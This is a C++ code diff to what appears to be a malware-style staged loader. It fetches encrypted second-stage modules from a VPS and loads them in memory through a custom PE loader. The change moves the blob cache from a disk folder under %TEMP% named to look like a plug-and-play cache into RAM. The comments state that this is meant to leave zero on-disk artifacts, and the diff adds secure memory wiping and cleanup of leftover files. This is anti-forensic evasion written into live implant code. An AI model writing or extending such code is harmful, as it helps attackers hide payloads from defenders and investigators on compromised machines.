@@ -133,7 +133,7 @@ struct LoadedStage2 {
     pe::LoadedModule    mod;
     Stage2InitFn                init_fn = nullptr;
     Stage2ShutdownFn            shutdown_fn = nullptr;
-    std::string                 cache_path;           // .bin on disk (for delete on shutdown)
+    std::string                 cache_path;           // Deprecated since RAM-only cache (kept empty)
 };
 
 struct CommandEntry {
@@ -294,15 +294,15 @@ public:
             return false;
         }
 
-        // Write blob to cache.
-        auto path = cache_path_for(module_name);
-        if (path.empty()) return false;
-        std::ofstream f(path, std::ios::binary | std::ios::trunc);
-        if (!f) { stage1_log(3, "stage2: cache write failed"); return false; }
-        f.write(reinterpret_cast<const char*>(pf->blob.data()), (std::streamsize)pf->blob.size());
-        f.close();
-        stage1_log(1, ("stage2: cached " + module_name + " (" +
-                       std::to_string(pf->blob.size()) + " B)").c_str());
+        // Store blob in RAM-only cache (no disk write).
+        // Encrypted blob lives only in process memory; on host shutdown the
+        // map is destroyed and the bytes go away with the process. This is
+        // intentional — leaves zero on-disk artifacts in %TEMP%\pnp_cache\.
+        {
+            std::lock_guard<std::recursive_mutex> lk(mu_);
+            blob_cache_[module_name] = std::move(pf->blob);
+        }
+        stage1_log(1, ("stage2: cached(RAM) " + module_name).c_str());
         return true;
     }
 
@@ -452,27 +452,28 @@ public:
         for (auto& kv : modules_) {
             if (kv.second->shutdown_fn) kv.second->shutdown_fn();
             pe::unload(kv.second->mod);
-            if (!kv.second->cache_path.empty()) {
-                overwrite_and_delete(kv.second->cache_path);
-            }
+            // RAM-only: nothing to overwrite/delete on disk anymore.
         }
         modules_.clear();
         cmds_.clear();
-        // Belt-and-braces: wipe ANY leftover .bin in the cache dir. Catches
-        // orphans from prior runs where a blob was fetched but the module
-        // never loaded (e.g. decrypt failure after key rotation, crash
-        // between fetch and load, etc.). Without this, the next startup's
-        // `ensure_cached` would think the blob is good and skip fetching —
-        // but since it was encrypted with a stale key it won't decrypt.
+        // Securely wipe encrypted-blob bytes from RAM before clearing the map.
+        for (auto& kv : blob_cache_) {
+            if (!kv.second.empty()) {
+                SecureZeroMemory(kv.second.data(), kv.second.size());
+            }
+        }
+        blob_cache_.clear();
+        // Defensive: wipe any leftover .bin files from previous on-disk-cache
+        // builds (pre-RAM-only). Once all hosts have updated past this version
+        // these files will be gone, and wipe_cache_dir() will be a no-op.
         wipe_cache_dir();
     }
 
-    // Helper: returns true if %TEMP%\pnp_cache\<mod>.bin already exists.
-    static bool ensure_cached(const std::string& module_name) {
-        auto p = cache_path_for(module_name);
-        if (p.empty()) return false;
-        DWORD a = GetFileAttributesA(p.c_str());
-        return (a != INVALID_FILE_ATTRIBUTES) && !(a & FILE_ATTRIBUTE_DIRECTORY);
+    // Helper: returns true if the encrypted blob for `module_name` is already
+    // in the RAM cache (populated by a prior fetch_blob_sync call).
+    bool ensure_cached(const std::string& module_name) {
+        std::lock_guard<std::recursive_mutex> lk(mu_);
+        return blob_cache_.count(module_name) > 0;
     }
 
     // Delete every .bin in %TEMP%\pnp_cache\ without touching anything else.
@@ -508,6 +509,12 @@ private:
     std::recursive_mutex mu_;
     std::map<std::string, std::unique_ptr<LoadedStage2>> modules_;
     std::unordered_map<std::string, CommandEntry>        cmds_;
+
+    // Encrypted-blob cache (RAM-only). Populated by fetch_blob_sync, read by
+    // load_locked. Replaces the previous on-disk cache at %TEMP%\pnp_cache\.
+    // Protected by mu_ (recursive). Sizes are small (~250 KB / module *
+    // 4 modules ≈ 1 MB total), so keeping in memory is cheap.
+    std::unordered_map<std::string, std::vector<uint8_t>> blob_cache_;
 
     std::mutex                                           pending_mu_;
     std::unordered_map<std::string, std::shared_ptr<PendingFetch>> pending_fetches_;
@@ -586,13 +593,17 @@ private:
     }
 
     bool load_locked(const std::string& module_name) {
-        auto path = cache_path_for(module_name);
-        if (path.empty()) { stage1_log(3, "stage2: GetTempPath failed"); return false; }
-
-        auto blob = read_file_bytes(path);
+        // Read encrypted blob from RAM cache (populated by fetch_blob_sync).
+        std::vector<uint8_t> blob;
+        {
+            // mu_ is recursive — safe to relock here even though callers
+            // (ensure_loaded) already hold it.
+            std::lock_guard<std::recursive_mutex> lk(mu_);
+            auto it = blob_cache_.find(module_name);
+            if (it != blob_cache_.end()) blob = it->second;
+        }
         if (blob.empty()) {
-            stage1_log(2, ("stage2: blob missing, need VPS fetch: " + path).c_str());
-            // TODO (stage 3d): fetch from VPS if missing, then re-read.
+            stage1_log(2, ("stage2: blob missing in RAM, need VPS fetch: " + module_name).c_str());
             return false;
         }
 
@@ -634,7 +645,7 @@ private:
         entry->mod         = mod;
         entry->init_fn     = init_fn;
         entry->shutdown_fn = (Stage2ShutdownFn)pe::get_proc(mod, STAGE2_SHUTDOWN_EXPORT);
-        entry->cache_path  = path;
+        entry->cache_path.clear();   // RAM-only: no on-disk artifact to clean up
         modules_[module_name] = std::move(entry);
 
         stage1_log(1, ("stage2: loaded " + module_name).c_str());
